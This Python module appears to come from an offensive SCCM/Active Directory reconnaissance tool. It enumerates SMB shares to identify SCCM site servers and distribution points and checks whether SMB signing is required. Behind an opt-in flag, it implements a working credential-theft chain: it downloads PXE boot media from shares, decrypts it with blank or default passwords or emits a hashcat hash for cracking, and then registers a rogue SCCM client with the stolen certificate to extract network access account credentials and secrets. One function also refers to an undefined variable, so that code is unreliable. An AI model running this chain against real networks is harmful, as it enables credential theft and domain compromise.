"""
SMB collection for ConfigManBearPig.

Translated from PowerShell Invoke-SMBCollection (lines 9000-9260)
and Get-SMBSigningRequiredViaSMBNegotiate (lines 5143-5258).

Discovers SCCM roles by enumerating SMB shares:
- SMS_SITE share -> Site Server
- SMS_DP$ share -> Distribution Point
- REMINST share -> PXE-enabled DP
- SCCMContentLib$ share -> Content Library
- SMSPKG shares -> Legacy content library

Also checks SMB signing requirements via raw SMB2 negotiate.

When --enable-bad-opsec is set (CRED-6, Misconfiguration-Manager):
Scans REMINST and SCCMContentLib$ shares for PXE boot media files
(Variables.dat, *.boot.var), downloads them via SMB, and attempts
decryption to extract management point addresses, client certificates,
and policy secrets.
"""

import base64
import io
import logging
import os
import re
import socket
import struct
import xml.etree.ElementTree as ET
from typing import Any, Optional

from lib.ad_resolver import ADResolver
from lib.graph import GraphStore
from lib.targets import CollectionTarget, TargetManager

logger = logging.getLogger("ConfigManBearPig")

# Try to import impacket for SMB operations
try:
    from impacket.smbconnection import SMBConnection
    from impacket.smb3structs import SMB2_NEGOTIATE_SIGNING_REQUIRED
    HAS_IMPACKET = True
except ImportError:
    HAS_IMPACKET = False


def invoke_smb_collection(
    target: CollectionTarget,
    ad_resolver: ADResolver,
    graph: GraphStore,
    target_manager: TargetManager,
    domain: str,
    username: Optional[str] = None,
    password: Optional[str] = None,
    *,
    enable_bad_opsec: bool = False,
    show_cleartext_passwords: bool = False,
) -> None:
    """
    Run SMB collection against a target.

    Translated from PowerShell Invoke-SMBCollection (lines 9000-9260).

    When enable_bad_opsec=True and REMINST or SCCMContentLib$ shares are
    found, scans for PXE boot media files (CRED-6).
    """
    hostname = target.hostname
    logger.info(f"Starting SMB collection on {hostname}...")

    # Fast port check — SMB uses port 445
    try:
        with socket.create_connection((hostname, 445), timeout=3):
            pass
    except (socket.timeout, ConnectionRefusedError, OSError):
        logger.info(f"SMB port 445 not open on {hostname}, skipping SMB collection")
        return

    # Check SMB signing
    smb_signing_required = _check_smb_signing(hostname)
    if smb_signing_required is not None:
        if smb_signing_required:
            logger.info(f"SMB signing is REQUIRED on {hostname}")
        else:
            logger.info(f"SMB signing is NOT required on {hostname}")

        if target.sid:
            graph.upsert_node(
                target.sid,
                ["Computer", "Base"],
                properties={
                    "SMBSigningRequired": smb_signing_required,
                    "collectionSource": ["SMB-Negotiate"],
                },
                ad_object=target.ad_object,
            )

    # Enumerate SMB shares
    shares = _enumerate_shares(hostname, domain, username, password)

    if not shares:
        logger.info(f"Could not enumerate shares on {hostname}")
        logger.info("SMB collection completed")
        return

    logger.info(f"Enumerated {len(shares)} shares on {hostname}")

    # Analyze shares for SCCM indicators
    collection_sources: list[str] = []
    site_code: Optional[str] = None
    is_site_server = False
    is_dp = False
    is_pxe_enabled = False
    hosts_content_lib = False
    roles: list[str] = []

    for share in shares:
        share_name = share.get("name", "")
        share_comment = share.get("comment", "")
        logger.debug(f"    {share_name} ({share_comment})")

        # SMS_SITE share -> Site Server
        if share_name == "SMS_SITE":
            collection_sources.append("SMB-SMS_SITE")
            is_site_server = True
            match = re.search(r"SMS Site (\w+)", share_comment)
            if match:
                site_code = match.group(1)
                logger.info(f"Found site server for site: {site_code}")

        # SMS_<sitecode> share
        elif re.match(r"^SMS_(\w+)$", share_name):
            collection_sources.append("SMB-SMS_*")
            match = re.search(r"SMS Site (\w+)", share_comment)
            if match:
                is_site_server = True
                site_code = match.group(1)
                logger.info(f"Found site server for site: {site_code}")

        # SMS_DP$ share -> Distribution Point
        elif share_name == "SMS_DP$":
            collection_sources.append("SMB-SMS_DP$")
            is_dp = True
            match = re.search(r"SMS Site (\w+)", share_comment)
            if match:
                site_code = match.group(1)
            logger.info(f"Found distribution point role for site: {site_code}")

        # REMINST share -> PXE-enabled DP
        elif share_name == "REMINST":
            collection_sources.append("SMB-REMINST")
            is_pxe_enabled = True
            logger.info("Distribution point has PXE support enabled")

        # SCCMContentLib$ -> Content library
        elif share_name == "SCCMContentLib$":
            collection_sources.append("SMB-SCCMContentLib$")
            hosts_content_lib = True
            logger.info("Target hosts the content library (SCCMContentLib$)")

        # SMSPKG shares -> Legacy content
        elif "SMSPKG" in share_name:
            collection_sources.append("SMB-SMSPKG$")
            hosts_content_lib = True
            logger.info("Target hosts the legacy content library (SMSPKG)")

        # Check share descriptions for site code
        if not site_code:
            match = re.search(r"SMS Site (\w+)", share_comment)
            if match:
                collection_sources.append("SMB-ShareDescription")
                site_code = match.group(1)

    # Build role strings
    if is_site_server:
        role_str = f"SMS Site Server@{site_code}" if site_code else "SMS Site Server"
        roles.append(role_str)
    if is_dp:
        role_str = f"SMS Distribution Point@{site_code}" if site_code else "SMS Distribution Point"
        roles.append(role_str)

    # Create/update nodes
    if site_code:
        graph.upsert_node(
            site_code,
            ["SCCM_Site"],
            properties={
                "collectionSource": collection_sources,
                "SCCMInfra": True,
                "siteCode": site_code,
            },
        )

    if collection_sources and target.sid:
        props: dict[str, Any] = {
            "collectionSource": collection_sources,
            "SCCMInfra": True,
            "SCCMHostsContentLibrary": hosts_content_lib,
            "SCCMIsPXESupportEnabled": is_pxe_enabled,
        }
        if roles:
            props["SCCMSiteSystemRoles"] = roles
        if target.ad_object:
            props["name"] = target.ad_object.get("sAMAccountName", "")

        graph.upsert_node(
            target.sid,
            ["Computer", "Base"],
            properties=props,
            ad_object=target.ad_object,
        )

    # CRED-6: Scan DP shares for PXE boot media
    if enable_bad_opsec and (is_pxe_enabled or hosts_content_lib):
        _scan_pxe_media_on_shares(
            hostname=hostname,
            domain=domain,
            username=username,
            password=password,
            graph=graph,
            ad_resolver=ad_resolver,
            target_manager=target_manager,
            is_pxe_enabled=is_pxe_enabled,
            hosts_content_lib=hosts_content_lib,
            show_cleartext_passwords=show_cleartext_passwords,
            site_code=site_code,
        )

    logger.info("SMB collection completed")
    if graph.find_nodes_by_kind("SCCM_Site"):
        sites_info = ", ".join(
            n.get("properties", {}).get("siteCode", n.get("id", ""))
            for n in graph.find_nodes_by_kind("SCCM_Site")
        )
        logger.info(f"Sites found: {sites_info}")


def _check_smb_signing(hostname: str, port: int = 445) -> Optional[bool]:
    """
    Check if SMB signing is required via raw SMB2 negotiate.

    Translated from PowerShell Get-SMBSigningRequiredViaSMBNegotiate (lines 5143-5258).
    """
    try:
        sock = socket.create_connection((hostname, port), timeout=5)
    except (socket.timeout, ConnectionRefusedError, OSError):
        return None

    try:
        # Build SMB2 Negotiate Request
        negotiate = _build_smb2_negotiate()

        # Send over NetBIOS session
        # NetBIOS header: 4 bytes (session message type + length)
        nb_header = struct.pack(">I", len(negotiate))
        nb_header = bytes([0x00]) + nb_header[1:]  # Session Message type = 0x00

        sock.sendall(nb_header + negotiate)

        # Receive response
        response = b""
        while len(response) < 4:
            chunk = sock.recv(4 - len(response))
            if not chunk:
                return None
            response += chunk

        # Parse NetBIOS length
        nb_length = struct.unpack(">I", b"\x00" + response[1:4])[0]

        # Read full response
        smb_response = b""
        while len(smb_response) < nb_length:
            chunk = sock.recv(nb_length - len(smb_response))
            if not chunk:
                break
            smb_response += chunk

        # Parse SMB2 negotiate response
        if len(smb_response) < 70:
            return None

        # Check for SMB2 header magic
        if smb_response[:4] != b"\xfeSMB":
            return None

        # SecurityMode is at offset 70 in SMB2 negotiate response
        # SMB2 header is 64 bytes, negotiate response starts at 64
        # SecurityMode is at offset 2 in negotiate response body = 66 overall
        security_mode = struct.unpack("<H", smb_response[66:68])[0]

        # Bit 1 (0x02) = NEGOTIATE_SIGNING_REQUIRED
        signing_required = bool(security_mode & 0x02)
        return signing_required

    except Exception as e:
        logger.debug(f"SMB signing check failed for {hostname}: {e}")
        return None
    finally:
        sock.close()


def _build_smb2_negotiate() -> bytes:
    """Build an SMB2 Negotiate Request."""
    # SMB2 Header (64 bytes)
    header = bytearray(64)
    header[0:4] = b"\xfeSMB"  # Protocol ID
    header[4:6] = struct.pack("<H", 64)  # Header length
    header[6:8] = struct.pack("<H", 0)  # Credit charge
    header[8:12] = struct.pack("<I", 0)  # Status
    header[12:14] = struct.pack("<H", 0)  # Command: NEGOTIATE
    header[14:16] = struct.pack("<H", 1)  # Credits requested
    header[16:20] = struct.pack("<I", 0)  # Flags
    header[20:24] = struct.pack("<I", 0)  # Next command
    header[24:32] = struct.pack("<Q", 1)  # Message ID
    header[32:36] = struct.pack("<I", 0)  # Reserved (Process ID)
    header[36:40] = struct.pack("<I", 0)  # Tree ID
    header[40:48] = struct.pack("<Q", 0)  # Session ID
    header[48:64] = b"\x00" * 16  # Signature

    # SMB2 Negotiate Request Body
    body = bytearray()
    body.extend(struct.pack("<H", 36))  # StructureSize
    body.extend(struct.pack("<H", 2))  # DialectCount
    body.extend(struct.pack("<H", 1))  # SecurityMode (signing enabled)
    body.extend(struct.pack("<H", 0))  # Reserved
    body.extend(struct.pack("<I", 0x7F))  # Capabilities
    body.extend(b"\x00" * 16)  # ClientGuid
    body.extend(struct.pack("<I", 0))  # NegotiateContextOffset
    body.extend(struct.pack("<H", 0))  # NegotiateContextCount
    body.extend(struct.pack("<H", 0))  # Reserved2

    # Dialects: SMB 2.0.2 and SMB 2.1
    body.extend(struct.pack("<H", 0x0202))  # SMB 2.0.2
    body.extend(struct.pack("<H", 0x0210))  # SMB 2.1

    return bytes(header) + bytes(body)


def _enumerate_shares(
    hostname: str,
    domain: str,
    username: Optional[str] = None,
    password: Optional[str] = None,
) -> list[dict[str, str]]:
    """
    Enumerate SMB shares on a target.

    Uses impacket SMBConnection if available.
    """
    if not HAS_IMPACKET:
        logger.debug("impacket not available for share enumeration")
        return []

    try:
        # Parse credentials
        lm_hash = ""
        nt_hash = ""
        domain_part = domain.split(".")[0] if domain else ""

        if username:
            if "\\" in username:
                domain_part, user = username.split("\\", 1)
            else:
                user = username
        else:
            user = ""

        conn = SMBConnection(hostname, hostname, timeout=5)

        if user and password:
            conn.login(user, password, domain_part, lm_hash, nt_hash)
        else:
            # Try null session or current creds
            try:
                conn.login("", "", domain_part)
            except Exception:
                logger.debug(f"Anonymous SMB login failed for {hostname}")
                return []

        shares = conn.listShares()
        result = []
        for share in shares:
            try:
                share_name = share["shi1_netname"][:-1]  # Remove null terminator
            except Exception:
                share_name = str(getattr(share, "shi1_netname", "")).rstrip("\x00")
            try:
                share_comment = share["shi1_remark"][:-1]  # Remove null terminator
            except Exception:
                share_comment = str(getattr(share, "shi1_remark", "")).rstrip("\x00")
            if isinstance(share_comment, bytes):
                share_comment = share_comment.decode("utf-8", errors="ignore")
            result.append({"name": share_name, "comment": share_comment})

        conn.logoff()
        return result

    except Exception as e:
        logger.debug(f"Share enumeration failed for {hostname}: {e}")
        return []


# ------------------------------------------------------------------ #
#  CRED-6: PXE Boot Media Scanning on SMB Shares
# ------------------------------------------------------------------ #

# Common paths where PXE media files are found on DP shares
_REMINST_MEDIA_PATHS = [
    "\\SMSTemp",
    "\\SMSImages",
    "\\tmp",
]

# File patterns indicating PXE boot media
_PXE_MEDIA_EXTENSIONS = (".boot.var", "variables.dat")


def _scan_pxe_media_on_shares(
    hostname: str,
    domain: str,
    username: Optional[str],
    password: Optional[str],
    graph: GraphStore,
    ad_resolver: ADResolver,
    target_manager: TargetManager,
    is_pxe_enabled: bool,
    hosts_content_lib: bool,
    show_cleartext_passwords: bool,
    site_code: Optional[str],
) -> None:
    """
    Scan REMINST and SCCMContentLib$ shares for PXE boot media files (CRED-6).

    When PXE media files are found, downloads and attempts decryption to
    extract management point addresses, client certificates, and secrets.
    """
    if not HAS_IMPACKET:
        logger.debug("impacket not available for CRED-6 share scanning")
        return

    logger.info(f"CRED-6: Scanning {hostname} for PXE boot media on SMB shares...")

    # Connect to SMB
    conn = _smb_connect(hostname, domain, username, password)
    if conn is None:
        logger.warning(f"CRED-6: Could not connect to {hostname} for share scanning")
        return

    media_files: list[tuple[str, bytes]] = []  # (remote_path, file_data)

    try:
        # Scan REMINST share (PXE-enabled DP)
        if is_pxe_enabled:
            _scan_share_for_media(conn, "REMINST", _REMINST_MEDIA_PATHS, media_files)

        # Scan SCCMContentLib$ share
        if hosts_content_lib:
            _scan_share_for_media(conn, "SCCMContentLib$", ["\\"], media_files)

        conn.logoff()
    except Exception as e:
        logger.debug(f"CRED-6: Share scanning error on {hostname}: {e}")
        try:
            conn.logoff()
        except Exception:
            pass

    if not media_files:
        logger.info(f"CRED-6: No PXE boot media files found on {hostname}")
        return

    logger.info(f"CRED-6: Found {len(media_files)} PXE boot media file(s) on {hostname}")

    # Process each media file
    for remote_path, media_data in media_files:
        _process_smb_pxe_media(
            media_data=media_data,
            remote_path=remote_path,
            dp_hostname=hostname,
            graph=graph,
            ad_resolver=ad_resolver,
            target_manager=target_manager,
            domain=domain,
            show_cleartext_passwords=show_cleartext_passwords,
            site_code=site_code,
        )


def _smb_connect(
    hostname: str,
    domain: str,
    username: Optional[str],
    password: Optional[str],
) -> Optional["SMBConnection"]:
    """Create an authenticated SMB connection. Returns None on failure."""
    try:
        domain_part = domain.split(".")[0] if domain else ""
        user = ""
        if username:
            if "\\" in username:
                domain_part, user = username.split("\\", 1)
            else:
                user = username

        conn = SMBConnection(hostname, hostname, timeout=5)
        if user and password:
            conn.login(user, password, domain_part, "", "")
        else:
            conn.login("", "", domain_part)
        return conn
    except Exception as e:
        logger.debug(f"SMB connect failed for {hostname}: {e}")
        return None


def _scan_share_for_media(
    conn: "SMBConnection",
    share_name: str,
    search_paths: list[str],
    results: list[tuple[str, bytes]],
) -> None:
    """
    Recursively scan a share for PXE media files.

    Searches the specified paths for files matching PXE media patterns.
    Downloads matching files and appends (path, data) to results.
    """
    for search_path in search_paths:
        try:
            _scan_directory_recursive(conn, share_name, search_path, results, depth=0)
        except Exception as e:
            logger.debug(f"CRED-6: Error scanning {share_name}{search_path}: {e}")


def _scan_directory_recursive(
    conn: "SMBConnection",
    share_name: str,
    path: str,
    results: list[tuple[str, bytes]],
    depth: int,
    max_depth: int = 4,
) -> None:
    """Recursively scan a directory for PXE media files, up to max_depth."""
    if depth > max_depth:
        return

    try:
        entries = conn.listPath(share_name, path + "\\*")
    except Exception:
        return

    for entry in entries:
        name = entry.get_longname()
        if name in (".", ".."):
            continue

        full_path = f"{path}\\{name}"

        if entry.is_directory():
            _scan_directory_recursive(conn, share_name, full_path, results, depth + 1, max_depth)
        else:
            name_lower = name.lower()
            if any(name_lower.endswith(ext) for ext in _PXE_MEDIA_EXTENSIONS):
                logger.info(f"CRED-6: Found PXE media file: \\\\{share_name}{full_path}")
                data = _download_smb_file(conn, share_name, full_path)
                if data:
                    results.append((f"\\\\{share_name}{full_path}", data))


def _download_smb_file(
    conn: "SMBConnection",
    share_name: str,
    file_path: str,
    max_size: int = 10 * 1024 * 1024,
) -> Optional[bytes]:
    """Download a file from an SMB share. Returns bytes or None."""
    try:
        buf = io.BytesIO()
        conn.getFile(share_name, file_path, buf.write)
        data = buf.getvalue()
        if len(data) > max_size:
            logger.warning(f"CRED-6: File too large ({len(data)} bytes), skipping: {file_path}")
            return None
        return data
    except Exception as e:
        logger.debug(f"CRED-6: Failed to download {share_name}{file_path}: {e}")
        return None


def _process_smb_pxe_media(
    media_data: bytes,
    remote_path: str,
    dp_hostname: str,
    graph: GraphStore,
    ad_resolver: ADResolver,
    target_manager: TargetManager,
    domain: str,
    show_cleartext_passwords: bool,
    site_code: Optional[str],
) -> None:
    """
    Process a PXE boot media file downloaded from an SMB share.

    Attempts decryption and extracts management point info, certificates,
    and optionally triggers policy secret extraction.
    """
    try:
        from lib.sccm_crypto import (
            decrypt_media_variable_file,
            get_hashcat_hash,
        )
    except ImportError:
        logger.warning("CRED-6: sccm_crypto not available")
        return

    logger.info(f"CRED-6: Processing PXE media ({len(media_data)} bytes) from {remote_path}")

    # Attempt decryption with blank password (empty UTF-16-LE)
    media_xml = decrypt_media_variable_file(media_data, b"")
    if media_xml:
        logger.info(f"CRED-6: Successfully decrypted PXE media (blank password): {remote_path}")
    else:
        # Try with common default password "password" (UTF-16-LE)
        media_xml = decrypt_media_variable_file(media_data, "password".encode("utf-16-le"))
        if media_xml:
            logger.info(f"CRED-6: Decrypted PXE media with default password: {remote_path}")

    if not media_xml:
        # Output hashcat hash for offline cracking
        hashcat_hash = get_hashcat_hash(media_data)
        logger.info(f"CRED-6: PXE media is password-protected: {remote_path}")
        logger.info(f"  Hashcat hash: {hashcat_hash}")
        logger.info("  Crack with: hashcat -m 37200 (ConfigMgr CryptDeriveKey module)")
        return

    # Parse decrypted XML
    _process_decrypted_smb_media(
        media_xml=media_xml,
        remote_path=remote_path,
        dp_hostname=dp_hostname,
        graph=graph,
        target_manager=target_manager,
        domain=domain,
        show_cleartext_passwords=show_cleartext_passwords,
        site_code=site_code,
    )


def _process_decrypted_smb_media(
    media_xml: str,
    remote_path: str,
    dp_hostname: str,
    graph: GraphStore,
    target_manager: TargetManager,
    domain: str,
    show_cleartext_passwords: bool,
    site_code: Optional[str],
) -> None:
    """
    Process decrypted PXE boot media XML from an SMB share.

    Extracts management point info, certificates, and creates graph nodes/edges.
    """
    try:
        root = ET.fromstring(media_xml if media_xml.startswith('<') else media_xml.encode("utf-16-le"))
    except ET.ParseError:
        try:
            root = ET.fromstring(media_xml)
        except ET.ParseError as e:
            logger.warning(f"CRED-6: Could not parse decrypted media XML: {e}")
            return

    def _find_var(name: str) -> Optional[str]:
        elem = root.find(f'.//var[@name="{name}"]')
        return elem.text if elem is not None and elem.text else None

    mp_url = _find_var("SMSTSMP")
    media_site_code = _find_var("_SMSTSSiteCode")
    media_guid = _find_var("_SMSMediaGuid")
    media_pfx = _find_var("_SMSTSMediaPFX")

    effective_site_code = media_site_code or site_code

    logger.info(f"CRED-6: Decrypted PXE media from {remote_path}:")
    if mp_url:
        logger.info(f"  Management Point: {mp_url}")
    if media_site_code:
        logger.info(f"  Site Code: {media_site_code}")
    if media_guid:
        logger.info(f"  Media GUID: {media_guid}")

    # Add management point as target
    if mp_url:
        mp_host = mp_url.replace("http://", "").replace("https://", "").split("/")[0]
        target = target_manager.add_device(mp_host, source="SMB-CRED6-Media")
        if target and target.sid:
            graph.upsert_node(
                target.sid,
                ["Computer", "Base"],
                properties={
                    "collectionSource": ["SMB-CRED6-Media"],
                    "name": target.ad_object.get("sAMAccountName", "") if target.ad_object else mp_host,
                    "SCCMInfra": True,
                    "SCCMSiteSystemRoles": [f"SMS Management Point@{effective_site_code}"] if effective_site_code else ["SMS Management Point"],
                    "pxeMediaManagementPoint": mp_url,
                    "pxeMediaSource": remote_path,
                },
                ad_object=target.ad_object,
            )

    # Create site node
    if effective_site_code:
        graph.upsert_node(
            effective_site_code,
            ["SCCM_Site"],
            properties={
                "collectionSource": ["SMB-CRED6-Media"],
                "SCCMInfra": True,
                "siteCode": effective_site_code,
            },
        )

    # Analyze certificate for ELEVATE-5
    if media_pfx:
        _analyze_smb_pxe_certificate(
            pfx_base64=media_pfx,
            dp_hostname=dp_hostname,
            graph=graph,
            target_manager=target_manager,
            domain=domain,
            site_code=effective_site_code,
        )

    # If decrypted and MP found, attempt CRED-1 style policy extraction
    if mp_url and media_pfx and show_cleartext_passwords:
        _attempt_policy_extraction_from_media(
            mp_url=mp_url,
            pfx_base64=media_pfx,
            graph=graph,
            ad_resolver=ad_resolver,
            target_manager=target_manager,
            domain=domain,
            show_cleartext_passwords=show_cleartext_passwords,
            site_code=effective_site_code,
        )


def _analyze_smb_pxe_certificate(
    pfx_base64: str,
    dp_hostname: str,
    graph: GraphStore,
    target_manager: TargetManager,
    domain: str,
    site_code: Optional[str],
) -> None:
    """
    Analyze PXE certificate from SMB-retrieved media for ELEVATE-5.

    Reuses the same logic as dhcp_collector._analyze_pxe_certificate.
    """
    try:
        from cryptography.hazmat.primitives.serialization import pkcs12
        from cryptography import x509

        pfx_bytes = base64.b64decode(pfx_base64)
        private_key, cert, chain = pkcs12.load_key_and_certificates(pfx_bytes, None)

        if cert is None:
            logger.debug("CRED-6: No certificate in PXE media PFX")
            return

        issuer_cn = None
        for attr in cert.issuer:
            if attr.oid == x509.oid.NameOID.COMMON_NAME:
                issuer_cn = attr.value
                break

        subject_cn = None
        for attr in cert.subject:
            if attr.oid == x509.oid.NameOID.COMMON_NAME:
                subject_cn = attr.value
                break

        has_client_auth = False
        try:
            eku = cert.extensions.get_extension_for_class(x509.ExtendedKeyUsage)
            for usage in eku.value:
                if usage.dotted_string == "1.3.6.1.5.5.7.3.2":
                    has_client_auth = True
                    break
        except x509.ExtensionNotFound:
            pass

        logger.info(f"CRED-6: PXE Certificate from {dp_hostname}:")
        logger.info(f"  Subject: {subject_cn}")
        logger.info(f"  Issuer: {issuer_cn}")
        logger.info(f"  Client Auth EKU: {has_client_auth}")

        is_self_signed = (issuer_cn == subject_cn)
        is_sccm_signed = issuer_cn and ("SMS" in issuer_cn or "ConfigMgr" in issuer_cn or "SCCM" in issuer_cn)
        is_adcs = not is_self_signed and not is_sccm_signed

        if is_adcs and has_client_auth:
            logger.info(f"  ADCS-issued with Client Auth — ELEVATE-5 applicable")

            if subject_cn:
                dp_target = target_manager.add_device(subject_cn, source="SMB-CRED6-Cert")
                if dp_target and dp_target.sid:
                    auth_users_sid = "S-1-5-11"
                    graph.upsert_node(
                        auth_users_sid,
                        ["Group", "Base"],
                        properties={
                            "name": "AUTHENTICATED USERS@" + domain.upper(),
                            "objectid": auth_users_sid,
                            "domain": domain.upper(),
                        },
                    )
                    graph.upsert_edge(
                        auth_users_sid,
                        dp_target.sid,
                        "SCCM_ObtainCertFor",
                        properties={
                            "collectionSource": ["SMB-CRED6-Cert"],
                            "certificateIssuer": issuer_cn,
                            "certificateSubject": subject_cn,
                            "hasClientAuth": True,
                            "isADCS": True,
                        },
                    )
                    logger.info(f"  Created SCCM_ObtainCertFor edge: Authenticated Users -> {subject_cn}")
        elif is_adcs:
            logger.info(f"  ADCS-issued but WITHOUT Client Auth EKU")
        else:
            cert_type = "self-signed" if is_self_signed else "SCCM-signed"
            logger.info(f"  Certificate is {cert_type} (not PKI/ADCS)")

    except ImportError:
        logger.debug("CRED-6: Certificate analysis requires cryptography library")
    except Exception as e:
        logger.debug(f"CRED-6: PXE certificate analysis failed: {e}")


def _attempt_policy_extraction_from_media(
    mp_url: str,
    pfx_base64: str,
    graph: GraphStore,
    ad_resolver: ADResolver,
    target_manager: TargetManager,
    domain: str,
    show_cleartext_passwords: bool,
    site_code: Optional[str] = None,
) -> None:
    """
    Use extracted PXE certificate to authenticate to MP and request policies.

    This completes the CRED-6 -> CRED-1 chain: media from share -> cert -> policies.
    """
    try:
        from cryptography.hazmat.primitives.serialization import pkcs12
        from lib.sccm_client import SCCMPolicyClient

        pfx_bytes = base64.b64decode(pfx_base64)
        private_key, cert, chain = pkcs12.load_key_and_certificates(pfx_bytes, None)

        if private_key is None or cert is None:
            logger.debug("CRED-6: No usable key/cert in PFX for policy extraction")
            return

        import uuid
        client_name = f"CMBP-{str(uuid.uuid4())[:8]}.{domain}"

        logger.info(f"CRED-6: Attempting policy extraction using PXE certificate")
        logger.info(f"  Management Point: {mp_url}")
        logger.info(f"  Client name: {client_name}")

        client = SCCMPolicyClient(
            management_point=mp_url,
            client_name=client_name,
            private_key=private_key,
            certificate=cert,
        )

        guid = client.register_client()

        # Brief wait for collection assignment
        import time
        logger.info("  Waiting 30s for SCCM collection assignment...")
        time.sleep(30)

        policies = client.request_policies()

        if not client.secret_policies:
            logger.info("  No secret policies found via PXE certificate")
            return

        secrets = client.extract_secrets(show_cleartext=show_cleartext_passwords)

        from lib.secret_utils import (
            create_secret_node,
            extract_domain_users,
            resolve_and_create_secret_user,
        )

        for naa in secrets.get("naa_accounts", []):
            naa_user = naa.get("username", "")
            naa_pass = naa.get("password", "")
            if naa_user:
                logger.info(f"  Found NAA credential: {naa_user if show_cleartext_passwords else '(hidden)'}")
                resolve_and_create_secret_user(
                    ad_resolver, graph, naa_user, "NAA", site_code, "SMB-CRED6",
                )
            if naa_pass:
                create_secret_node(
                    graph, "NAA_Password", naa_pass, site_code, "SMB-CRED6",
                    name="NAA Password", show_cleartext=show_cleartext_passwords,
                )

        for cv in secrets.get("collection_variables", []):
            cv_name = cv.get("name", "unknown")
            cv_value = cv.get("value", "")
            logger.info(f"  Found collection variable: {cv_name}")
            domain_users = extract_domain_users(cv_value) if cv_value else []
            for du in domain_users:
                resolve_and_create_secret_user(
                    ad_resolver, graph, du, "CollectionVariable", site_code,
                    "SMB-CRED6", extra_props={"collectionVariableName": cv_name},
                )
            if not domain_users and cv_value and cv_value not in ("(encrypted)", "(decrypted - use --show-cleartext-passwords)"):
                create_secret_node(
                    graph, "CollectionVariable", cv_value, site_code, "SMB-CRED6",
                    name=cv_name, show_cleartext=show_cleartext_passwords,
                )

    except ImportError as e:
        logger.debug(f"CRED-6: Policy extraction requires sccm_client: {e}")
    except Exception as e:
        logger.warning(f"CRED-6: Policy extraction failed: {e}")
